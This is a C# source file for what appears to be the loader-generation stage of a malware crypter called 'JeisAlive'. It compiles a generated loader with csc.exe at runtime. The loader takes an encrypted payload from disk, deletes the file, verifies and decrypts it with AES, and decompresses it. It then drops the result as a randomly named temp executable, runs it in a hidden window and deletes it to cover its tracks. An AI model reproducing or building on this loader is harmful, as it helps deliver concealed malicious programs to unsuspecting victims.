using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace JeisAlive.Engine
{
    public static class ManagedEntryGenerator
    {
        private static readonly RandomNumberGenerator Rng = RandomNumberGenerator.Create();

        public static byte[] GenerateAndCompile(byte[] l3Nonce)
        {
            string source = GenerateSource("JeisAlive.Loader", "Entry", "Run", null);

            string tempDir = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            Directory.CreateDirectory(tempDir);

            try
            {
                string csPath = Path.Combine(tempDir, "entry.cs");
                string dllPath = Path.Combine(tempDir, "entry.dll");

                File.WriteAllText(csPath, source, Encoding.UTF8);

                string cscPath = FindCscPath();
                var psi = new ProcessStartInfo
                {
                    FileName = cscPath,
                    Arguments = $"/target:library /optimize+ /nologo /out:\"{dllPath}\" \"{csPath}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                using (var proc = Process.Start(psi)!)
                {
                    string stdout = proc.StandardOutput.ReadToEnd();
                    string stderr = proc.StandardError.ReadToEnd();

                    if (!proc.WaitForExit(30_000))
                    {
                        proc.Kill();
                        throw new TimeoutException("csc.exe compilation timed out after 30 seconds.");
                    }

                    if (proc.ExitCode != 0)
                        throw new InvalidOperationException(
                            $"csc.exe failed (exit {proc.ExitCode}):\n{stdout}\n{stderr}");
                }

                return File.ReadAllBytes(dllPath);
            }
            finally
            {
                try { Directory.Delete(tempDir, true); } catch { }
            }
        }

        private static string GenerateSource(string ns, string className, string methodName, string? nonceLiteral)
        {
            return $@"
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;

namespace {ns}
{{
    public class {className}
    {{
        static string _dbgPath = Path.Combine(Path.GetTempPath(), ""jeisalive_dbg.txt"");
        static void DBG(string msg) {{ try {{ File.AppendAllText(_dbgPath, msg + Environment.NewLine); }} catch {{}} }}

        public static int {methodName}(string arg)
        {{
            try
            {{
                DBG(""[M1] Entry called with: "" + (arg ?? ""null""));
                string[] parts = arg.Split('|');
                DBG(""[M2] Key="" + parts[0].Substring(0,8) + ""... Path="" + parts[1]);
                byte[] key = HexDec(parts[0]);
                byte[] enc = File.ReadAllBytes(parts[1]);
                DBG(""[M3] Payload read: "" + enc.Length + "" bytes"");
                File.Delete(parts[1]);

                byte[] iv = new byte[16];
                Array.Copy(enc, 0, iv, 0, 16);
                int ctLen = enc.Length - 16 - 32;
                byte[] ct = new byte[ctLen];
                Array.Copy(enc, 16, ct, 0, ctLen);
                byte[] storedHmac = new byte[32];
                Array.Copy(enc, 16 + ctLen, storedHmac, 0, 32);

                using (var hm = new HMACSHA256(key))
                {{
                    hm.TransformBlock(iv, 0, 16, null, 0);
                    hm.TransformFinalBlock(ct, 0, ct.Length);
                    byte[] computed = hm.Hash;
                    bool ok = true;
                    for (int i = 0; i < 32; i++) ok &= computed[i] == storedHmac[i];
                    if (!ok) {{ DBG(""[!] HMAC mismatch""); return 2; }}
                }}
                DBG(""[M4] HMAC verified, decrypting AES-CBC..."");

                byte[] decrypted;
                using (var aes = Aes.Create())
                {{
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    using (var d = aes.CreateDecryptor())
                        decrypted = d.TransformFinalBlock(ct, 0, ct.Length);
                }}

                byte[] payload;
                using (var ms = new MemoryStream(decrypted))
                using (var gz = new GZipStream(ms, CompressionMode.Decompress))
                using (var o = new MemoryStream())
                {{
                    gz.CopyTo(o);
                    payload = o.ToArray();
                }}

                DBG(""[M5] Writing client exe to temp ("" + payload.Length + "" bytes)"");
                string exePath = Path.Combine(Path.GetTempPath(), ""jeisalive_"" + Path.GetRandomFileName() + "".exe"");
                File.WriteAllBytes(exePath, payload);

                DBG(""[M6] Launching: "" + exePath);
                var psi = new System.Diagnostics.ProcessStartInfo();
                psi.FileName = exePath;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                var proc = System.Diagnostics.Process.Start(psi);
                DBG(""[M7] PID="" + (proc != null ? proc.Id.ToString() : ""null""));

                System.Threading.Thread.Sleep(5000);
                try {{ File.Delete(exePath); DBG(""[M8] Temp deleted""); }}
                catch {{ DBG(""[M8] Temp in use, will self-clean""); }}
                return 0;
            }}
            catch (Exception ex) {{
                DBG(""[!] MANAGED ERROR: "" + ex.GetType().Name + "": "" + ex.Message);
                if (ex.InnerException != null)
                    DBG(""[!] INNER: "" + ex.InnerException.GetType().Name + "": "" + ex.InnerException.Message);
                return 1;
            }}
        }}

        static byte[] HexDec(string h)
        {{
            byte[] b = new byte[h.Length / 2];
            for (int i = 0; i < b.Length; i++)
                b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
            return b;
        }}
    }}
}}";
        }

        private static string FindCscPath()
        {
            string[] candidates =
            {
                @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
                @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
            };

            foreach (string path in candidates)
            {
                if (File.Exists(path))
                    return path;
            }

            throw new FileNotFoundException(
                "Could not find csc.exe in .NET Framework directories.");
        }


        private static string RandomIdentifier()
        {
            const string letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            byte[] lengthByte = new byte[1];
            Rng.GetBytes(lengthByte);
            int length = 8 + (lengthByte[0] % 5);

            byte[] bytes = new byte[length];
            Rng.GetBytes(bytes);
            char[] result = new char[length];
            for (int i = 0; i < length; i++)
                result[i] = letters[bytes[i] % letters.Length];
            return new string(result);
        }
    }
}
